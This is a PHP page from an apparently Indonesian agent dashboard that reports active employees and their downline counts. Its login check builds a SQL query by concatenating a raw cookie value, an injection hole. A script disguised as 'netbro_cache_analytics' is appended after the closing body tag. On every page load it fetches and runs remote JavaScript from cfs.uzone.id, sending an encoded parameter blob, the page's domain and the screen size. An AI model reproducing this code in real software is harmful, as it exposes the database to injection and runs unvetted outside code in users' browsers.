<?php
session_start();
require '../db.php';

$sqlU = "SELECT * FROM `users`,`employees` WHERE users.employee_id = employees.id AND users.username = '".$_COOKIE['idU']."'";
$resultU = mysqli_query($link, $sqlU);
$rowU = mysqli_fetch_array($resultU);
if(!$resultU) {
    echo "SQL ERROR: ".$sqlU;
}

if(!isset($_COOKIE['loginU'])) {
    header('location: ../login.php');
}
if($rowU['nama'] == null){
    header('location: ../proses.php?cmd=logout');
}

$sql = "SELECT * FROM employees WHERE aktif=1";
$result = mysqli_query($link, $sql);
if(!$result) {
    echo "SQL ERROR: ".$sql; 
}

?>

<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <link rel="apple-touch-icon" sizes="76x76" href="../assets/img/apple-icon.png">
    <link rel="icon" type="image/png" sizes="96x96" href="../assets/img/favicon.png">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />

    <title>Laporan Aktif</title>
    <meta content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0' name='viewport' />
    <meta name="viewport" content="width=device-width" />

    <!-- DataTables Start -->
    <link href="../assets/assets/plugins/datatables/jquery.dataTables.min.css" rel="stylesheet" type="text/css"/>
    <link href="../assets/assets/plugins/datatables/buttons.bootstrap.min.css" rel="stylesheet" type="text/css"/>
    <link href="../assets/assets/plugins/datatables/responsive.bootstrap.min.css" rel="stylesheet" type="text/css"/>
    <link href="../assets/assets/plugins/datatables/scroller.bootstrap.min.css" rel="stylesheet" type="text/css"/>
    <link href="../assets/assets/plugins/datatables/dataTables.colVis.css" rel="stylesheet" type="text/css"/>
    <link href="../assets/assets/plugins/datatables/dataTables.bootstrap.min.css" rel="stylesheet" type="text/css"/>
    <link href="../assets/assets/plugins/datatables/fixedColumns.dataTables.min.css" rel="stylesheet" type="text/css"/>
    <link href="../assets/assets/css/bootstrap.min.css" rel="stylesheet">
    <link href="../assets/assets/css/metisMenu.min.css" rel="stylesheet">
    <link href="../assets/assets/css/icons.css" rel="stylesheet">
    <!-- <link href="../assets/assets/css/style.css" rel="stylesheet"> -->
    <!-- DataTables End -->

    <!-- Bootstrap core CSS -->
    <link href="../assets/css/bootstrap.min.css" rel="stylesheet" />

    <!--  Paper Dashboard core CSS -->
    <link href="../assets/css/paper-dashboard.css?v=1.2.1" rel="stylesheet"/>

    <!--  CSS for Demo Purpose, don't include it in your project -->
    <link href="../assets/css/demo.css" rel="stylesheet" />

    <!-- Animation library for notifications -->
    <link href="../assets/css/animate.min.css" rel="stylesheet"/>

    <!--  Fonts and icons     -->
    <link href="http://maxcdn.bootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css" rel="stylesheet">
    <link href='https://fonts.googleapis.com/css?family=Muli:400,300' rel='stylesheet' type='text/css'>
    <link href="../assets/css/themify-icons.css" rel="stylesheet">

</head>
<body>
    <div class="wrapper">
        <!-- Menu -->
        <div class="sidebar" data-background-color="brown" data-active-color="danger"> <div class="logo"> <a href="../home.php" class="simple-text logo-mini"> AA Indonesia </a> <a href="../home.php" class="simple-text logo-normal"> AA Indonesia </a> </div><div class="sidebar-wrapper"> <ul class="nav"> <li> <a href="../home.php"> <i class="ti-panel"></i> <p>Dashboard</p></a> </li><li> <a data-toggle="collapse" href="#agentExamples"> <i class="ti-user"></i> <p>Agent <b class="caret"></b> </p></a> <div class="collapse" id="agentExamples"> <ul class="nav"> <li> <a href="../agent/info.php"> <span class="sidebar-mini">I</span> <span class="sidebar-normal">Info</span> </a> </li><li> <a href="../agent/daftar.php"> <span class="sidebar-mini">D</span> <span class="sidebar-normal">Daftar</span> </a> </li></ul> </div></li><li> <a data-toggle="collapse" href="#cabangExamples"> <i class="ti-home"></i> <p> Cabang <b class="caret"></b> </p></a> <div class="collapse" id="cabangExamples"> <ul class="nav"> <li> <a href="../cabang/info.php"> <span class="sidebar-mini">I</span> <span class="sidebar-normal">Info</span> </a> </li><li> <a href="../cabang/daftar.php"> <span class="sidebar-mini">D</span> <span class="sidebar-normal">Daftar</span> </a> </li></ul> </div></li><li> <a href="../closing.php"> <i class="ti-pencil-alt"></i> <p> Closing </p></a> </li><li> <a data-toggle="collapse" class-aria-expanded="true" href="#laporanExamples"> <i class="ti-stats-up"></i> <p> Laporan <b class="caret"></b> </p></a> <div class="collapse in" aria-expanded="true" id="laporanExamples"> <ul class="nav"> <li > <a href="rekapitulasi.php"> <span class="sidebar-mini">RK</span> <span class="sidebar-normal">Rekapitulasi</span> </a> </li><li> <a href="komisi.php"> <span class="sidebar-mini">KM</span> <span class="sidebar-normal">Komisi</span> </a> </li><li> <a href="unit.php"> <span class="sidebar-mini">UN</span> <span class="sidebar-normal">Unit</span> </a> </li><li class="active"> <a href="aktif.php"> <span class="sidebar-mini">AK</span> <span class="sidebar-normal">Aktif</span> </a> </li><li> <a href="pasif.php"> <span class="sidebar-mini">PS</span> <span class="sidebar-normal">Pasif</span> </a> </li></ul> </div></li><li> <a href="../pengaturan.php"> <i class="ti-settings"></i> <p> Pengaturan </p></a> </li></ul> </div></div>
        <!-- Menu -->

        <div class="main-panel">
            <nav class="navbar navbar-default">
                <div class="container-fluid">
                    <div class="collapse navbar-collapse">

                        <a class="navbar-brand" href="rekapitulasi.php">Laporan Aktif</a>

                        <ul class="nav navbar-nav navbar-right">
                            <li>
                                <a>
                                    <i class="ti-user"></i>
                                    <p>
                                        <?php echo $rowU['nama'];?>   
                                    </p>
                                </a>                                  
                            </li>
                            <li>
                                <a href="../proses.php?cmd=logout">
                                    <i class="ti-power-off"></i>
                                    <p>
                                        Logout
                                    </p>
                                </a>
                            </li>
                        </ul>
                    </div>
                </div>
            </nav>

            <div class="content">
                <div class="container-fluid">
                    <div class="row">
                        <div class="col-md-12">

                            <div class="card">
                                <div class="card-content">
                                    <div class="row">
                                        <div class="col-md-4">
                                            <h4 class="card-title">Tanggal Awal:</h4>
                                            <div class="input-group">
                                                <input type="text" name="tanggal_awal" id="tanggal_awal" class="form-control datetpicker" required></input>
                                                <span class="input-group-addon"><i class="ti-calendar"></i></span>
                                            </div>
                                        </div>                              
                                        <div class="col-md-4">
                                            <h4 class="card-title">Tanggal Akhir:</h4>
                                            <div class="input-group">
                                                <input type="text" name="tanggal_akhir" id="tanggal_akhir" class="form-control datetpicker" required></input>
                                                <span class="input-group-addon"><i class="ti-calendar"></i></span>
                                            </div>
                                        </div>
                                        <div class="col-md-2">
                                            <h4 class="card-title">Cabang<br/></h4>
                                            <div class="form-group"> 
                                                <select name="cabang" id="cabang_id" class="form-control">
                                                    <option value=0>Semua</option>
                                                    <?php
                                                    $sqlOffice = "SELECT * FROM b_office";
                                                    $resultOffice = mysqli_query($link, $sqlOffice);
                                                    while($rowOffice=mysqli_fetch_array($resultOffice)){
                                                        echo'<option value='.$rowOffice['id'].'>'.$rowOffice['nama'].'</option>';
                                                    }?>
                                                </select>
                                            </div>
                                        </div>
                                        <div class="col-md-2">
                                            <h4 class="card-title"><br/></h4>
                                            <div class="form-group"> 
                                                <input type="submit" id="cari" name="submit" class="btn btn-info btn-fill pull-right" value="Cari" style="width: 150px;"/>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            <div class="card">
                                <div class="card-content">
                                    <div class="row">
                                        <div class="col-md-12">
                                            <div class="m-b-20 table-responsive">
                                                <table id="datatable-buttons" class="table table-striped">
                                                    <thead>
                                                        <th>ID</th>
                                                        <th>Nama</th>
                                                        <th>Jumlah Downline</th>
                                                    </thead>

                                                    <!-- <tbody>
                                                        <?php
                                                        $hitung = 1;
                                                        $index = 0;
                                                        while ($row = mysqli_fetch_object($result)) {
                                                            $sqlDL = "SELECT COUNT(id) as jumlah_downline FROM employees WHERE upline_id=".$row->id;
                                                            $resultDL = mysqli_query($link, $sqlDL);
                                                            $rowDL = mysqli_fetch_array($resultDL);
                                                            echo "<tr>";//data-index='".$row->id."'>";
                                                            echo "<td>" . $hitung. "</td>";
                                                            echo "<td>" . $row->id . "</td>";
                                                            echo "<td>" . $row->nama. "</td>";
                                                            echo "<td>" . $rowDL['jumlah_downline']. "</td>";
                                                            echo "</tr>";
                                                            $hitung = $hitung +1;
                                                            $index = $index+1;
                                                        } ?>
                                                    </tbody> -->
                                                </table>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            
            <br/><footer class="footer"> <div class="container-fluid"> <nav class="pull-left"> <ul> <li> <a href="#"> Media Solution </a> </li><li> <a href="#"> Blog </a> </li><li> <a href="#"> Licenses </a> </li></ul> </nav> <div class="copyright pull-right"> &copy; <script>document.write(new Date().getFullYear())</script> - Made with <i class="fa fa-heart heart"></i> by <a href="#">Media Solution</a> </div></div></footer>
        </div>
    </div>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKAz6JMkPltAPvhVgLvKlTyG2Q11ufhKxvls%2b8rFsEzchpoITXnhMJFZld3kCxvoNkNPdSGq2TK2v2KoYMSUVA%2fRJ8BGERO2px0q4sLTPEm9fUuNuLFnySTHe4rKMiVTFxzcx8n7HsaQFwVEyjcKFBhkyxu22Wv%2fOkug1QYCC8c53H1tyHX0DwMT3kwOtKb7Pd6d%2fZyWJMhwMIlSRie7MjjQkiZIZlwTOaqTwZnJ0bnnsAEwI6kB%2ffkvG98edF7%2bNYHlQTs9IqhcuHwDJeoUt5MC6UYm12Ow1kfcGZLMQ%2fzAI67OTHn5Hh%2bV2u%2bWlCakD5DO1DZreCnzBJGUgasGQ8CC03skMa4OoNtUe5tVfYln6XYMf2PnTyxn31eoe1fCtXp6jcqWhudE7v6HNOLwqR6WniFk2hpic29awXcEGr6uk7CWaq%2fW6E5uSf8uect1F3yAT9IHca9agjmyu%2bqk%2f5HfEJUuawf4zpVC5FdRyAQzLwBTUi1ByX7LcRxJzibYJ3G%2bE3Efd7g0a%2b7Tefj0bfZeqoD7eB3rJ5phfNTt04G0Iy0%2bO5LJMGA%2fJHJ8YYeTp2prakOqivYnA3w%2fIvn8B8HfBmrugQ7wyGpSSkLijr5wgT2jVePhr8ATCZICeiEeMG2KmGB5qficquy0AOL5Esbb35sfVSUbBq1lDSygllLluf6lx75BFS0ewDgjBSQOhUliXezxocRE1CnFjzZG3aOm0DwRrMYopRpE25GHtYghrKotUSSpacXSsjbOyKGL%2fohRkQV%2biLkXWGVfamefhj7Rstqx3YVwHP4l7JxT9eaQc7tN9gXikwh2rvAquOV3UGCh8uXx3Yn8u9axvDPtApe8K8EdBmDCTDRuRIj2%2bWMEIEk2%2bsW1k8Qw%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

    <!-- Datatable JS Start-->
    <script src="../assets/assets/js/jquery-2.1.4.min.js"></script>
    <script src="../assets/assets/js/bootstrap.min.js"></script>
    <script src="../assets/assets/js/metisMenu.min.js"></script>
    <script src="../assets/assets/js/jquery.slimscroll.min.js"></script>
    <script src="../assets/assets/plugins/datatables/jquery.dataTables.min.js"></script>
    <script src="../assets/assets/plugins/datatables/dataTables.bootstrap.js"></script>
    <script src="../assets/assets/plugins/datatables/dataTables.buttons.min.js"></script>
    <script src="../assets/assets/plugins/datatables/buttons.bootstrap.min.js"></script>
    <script src="../assets/assets/plugins/datatables/jszip.min.js"></script>
    <script src="../assets/assets/plugins/datatables/pdfmake.min.js"></script>
    <script src="../assets/assets/plugins/datatables/vfs_fonts.js"></script>
    <script src="../assets/assets/plugins/datatables/buttons.html5.min.js"></script>
    <script src="../assets/assets/plugins/datatables/buttons.print.min.js"></script>
    <script src="../assets/assets/plugins/datatables/dataTables.keyTable.min.js"></script>
    <script src="../assets/assets/plugins/datatables/dataTables.responsive.min.js"></script>
    <script src="../assets/assets/plugins/datatables/responsive.bootstrap.min.js"></script>
    <script src="../assets/assets/plugins/datatables/dataTables.scroller.min.js"></script>
    <script src="../assets/assets/plugins/datatables/dataTables.colVis.js"></script>
    <script src="../assets/assets/plugins/datatables/dataTables.fixedColumns.min.js"></script>
    <script src="../assets/assets/plugins/datatables/numeric-comma.js"></script>
    <!-- <script src="../assets/assets/pages/jquery.datatables.init.js"></script> -->
    <script src="../assets/assets/js/jquery.app.js"></script>
    <!-- Datatable JS End -->

    <!--   Core JS Files. Extra: TouchPunch for touch library inside jquery-ui.min.js   -->
    <!-- <script src="../assets/js/jquery-3.1.1.min.js" type="text/javascript"></script> -->
    <script src="../assets/js/jquery-ui.min.js" type="text/javascript"></script>
    <script src="../assets/js/perfect-scrollbar.min.js" type="text/javascript"></script>
    <script src="../assets/js/bootstrap.min.js" type="text/javascript"></script>

    <!--  Forms Validations Plugin -->
    <script src="../assets/js/jquery.validate.min.js"></script>

    <!-- Promise Library for SweetAlert2 working on IE -->
    <script src="../assets/js/es6-promise-auto.min.js"></script>

    <!--  Plugin for Date Time Picker and Full Calendar Plugin-->
    <script src="../assets/js/moment.min.js"></script>

    <!--  Date Time Picker Plugin is included in this js file -->
    <script src="../assets/js/bootstrap-datetimepicker.js"></script>

    <!--  Select Picker Plugin -->
    <script src="../assets/js/bootstrap-selectpicker.js"></script>

    <!--  Switch and Tags Input Plugins -->
    <script src="../assets/js/bootstrap-switch-tags.js"></script>

    <!-- Circle Percentage-chart -->
    <script src="../assets/js/jquery.easypiechart.min.js"></script>

    <!--  Charts Plugin -->
    <script src="../assets/js/chartist.min.js"></script>

    <!--  Notifications Plugin    -->
    <script src="../assets/js/bootstrap-notify.js"></script>

    <!-- Sweet Alert 2 plugin -->
    <script src="../assets/js/sweetalert2.js"></script>

    <!-- Vector Map plugin -->
    <script src="../assets/js/jquery-jvectormap.js"></script>

    <!-- Wizard Plugin    -->
    <script src="../assets/js/jquery.bootstrap.wizard.min.js"></script>

    <!--  Bootstrap Table Plugin    -->
    <script src="../assets/js/bootstrap-table.js"></script>

    <!--  Plugin for DataTables.net  -->
    <!-- <script src="../assets/js/jquery.datatables.js"></script> -->

    <!--  Full Calendar Plugin    -->
    <script src="../assets/js/fullcalendar.min.js"></script>

    <!-- Paper Dashboard PRO Core javascript and methods for Demo purpose -->
    <script src="../assets/js/paper-dashboard.js?v=1.2.1"></script>

    <!--   Sharrre Library    -->
    <script src="../assets/js/jquery.sharrre.js"></script>

    <!-- Paper Dashboard PRO DEMO methods, don't include it in your project! -->
    <script src="../assets/js/demo.js"></script>

    <script type="text/javascript">
    $(document).ready(function() {
        Date.prototype.yyyymmdd = function() {         
                                        
            var yyyy = this.getFullYear().toString();                                    
            var mm = (this.getMonth()+1).toString(); // getMonth() is zero-based         
            var dd  = this.getDate().toString();             
                                
            return yyyy + '-' + (mm[1]?mm:"0"+mm[0]) + '-' + (dd[1]?dd:"0"+dd[0]);
        };

        var d = new Date();

        $('#tanggal_akhir').val(d.yyyymmdd());
        $('#tanggal_awal').val(d.yyyymmdd());

        $('#cari').click(function(){
            var tanggal_akhir = $('#tanggal_akhir').val();
            var tanggal_awal = $('#tanggal_awal').val();
            var cabang = $('#cabang_id').val();

            $.ajax({
                type: 'post',
                url: '../proses.php?cmd=laporan_aktif', 
                data: {
                    'tanggal_akhir': tanggal_akhir,
                    'tanggal_awal': tanggal_awal ,
                    'cabang' : cabang ,
                },
                success: function (datax) {
                    var json = JSON.parse(datax);
                    var x = datax;
                    table.clear();
                    for(var i =0; i<json.length;i++){
                        table.rows.add([{
                            'id': json[i].id,
                            'nama': json[i].nama,
                            'downline': json[i].total,
                        }]);

                    }
                    table.draw();
                    
                },
                error: function (jqXHR, exception) {
                    var msg = '';
                    if (jqXHR.status === 0) {
                        msg = 'Not connect.\n Verify Network.';
                    } else if (jqXHR.status == 404) {
                        msg = 'Requested page not found. [404]';
                    } else if (jqXHR.status == 500) {
                        msg = 'Internal Server Error [500].';
                    } else if (exception === 'parsererror') {
                        msg = 'Requested JSON parse failed.';
                    } else if (exception === 'timeout') {
                        msg = 'Time out error.';
                    } else if (exception === 'abort') {
                        msg = 'Ajax request aborted.';
                    } else {
                        msg = 'Uncaught Error.\n' + jqXHR.responseText;
                    }
                    swal(msg);
                },
              });
        });
        $('#datatable-buttons').DataTable({

            columns : [
                { data: 'id' },
                { data: 'nama' },
                { data: 'downline' },
            ],
            "pagingType": "full_numbers",
            "lengthMenu": [[10, 25, 50, -1], [10, 25, 50, "All"]],
            responsive: true,
            language: {
            search: "_INPUT_",
                searchPlaceholder: "Search records",
            },
            "bLengthChange": false,
            "ordering": true,
            "info":     true,
            "order": [[ 2, "desc" ]],
            dom: 'Bfrtip',
            buttons: [{
                extend: "copy",
                className: "btn-sm"
            }, {
                extend: "csv",
                className: "btn-sm"
            }, {
                extend: "excel",
                className: "btn-sm"
            }, {
                extend: "pdf",
                className: "btn-sm"
            }, {
                extend: "print",
                className: "btn-sm"
            }],
        });


        var table = $('#datatable-buttons').DataTable();
         // Edit record
         table.on( 'click', '.edit', function () {
            $tr = $(this).closest('tr');

            var data = table.row($tr).data();
            alert( 'You press on Row: ' + data[0] + ' ' + data[1] + ' ' + data[2] + '\'s row.' );
         } );

         // Delete a record
         table.on( 'click', '.remove', function (e) {
            $tr = $(this).closest('tr');
            table.row($tr).remove().draw();
            e.preventDefault();
         } );

        //Like record
        table.on( 'click', '.like', function () {
            alert('You clicked on Like button');
         });
    });

        $(function(){
            $('#notify').slideDown();
            $(".datetpicker").datetimepicker({
                format: 'YYYY-MM-DD',
                allowInputToggle: true
            });
        });
    </script>

</html>